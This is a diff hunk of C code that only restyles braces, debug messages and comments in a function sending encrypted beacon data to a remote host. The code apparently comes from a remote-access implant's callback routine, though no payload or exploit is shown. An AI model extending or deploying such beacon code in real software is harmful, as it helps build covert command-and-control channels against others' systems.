@@ -555,41 +555,33 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	encrypt_size = packetSize + (8 - (packetSize % 8));
 
 	//connect to the client
-	DLX(4, printf("Connecting to client %s on port %d using socket: %d\n", beaconInfo->ip, beaconInfo->port, sock));
+	DLX(4, printf("Attempting connection to client %s on port %d...\n", beaconInfo->ip, beaconInfo->port));
 	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);
 
-	if ( retval != SUCCESS )
-	{
+	if ( retval != SUCCESS ) {
 		DLX(1, printf("\tERROR: net_connect(): ");
-			if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED )
-			{
+			if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED ) {
 				printf( "NET_CONNECT_FAILED\n");
-			}
-			else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED )
-			{
+			} else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED ) {
 				printf( "NET_SOCKET_FAILED\n");
-			}
-			else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST )
-			{
+			} else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST ) {
 				printf( "NET_UNKNOWN_HOST\n");
-			}
-			else
-			{
+			} else {
 				printf( "Unknown error\n");
 			}
 		);
 
 		// we can return from here. no need to goto to bottom of function because
 		// at this stage, there is nothing to clean-up
-		//return FAILURE; 
-		//Don't think that is true you have allocated all of your beacon info
-		//however it just couldnt connect out lets clean up
+		// return FAILURE;
+		// Don't think that is true you have allocated all of your beacon info
+		// however it just couldn't connect out; lets clean up.
 		retval = FAILURE;
 		goto EXIT;
 	}
 
 	//setup ssl
-	DLX(4, printf("\tSetup crypto\n"));
+	DLX(4, printf("\tConnection successful, setup crypto\n"));
 	if ((beacon_io = crypt_setup_client(&sock)) == NULL)
 	{
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
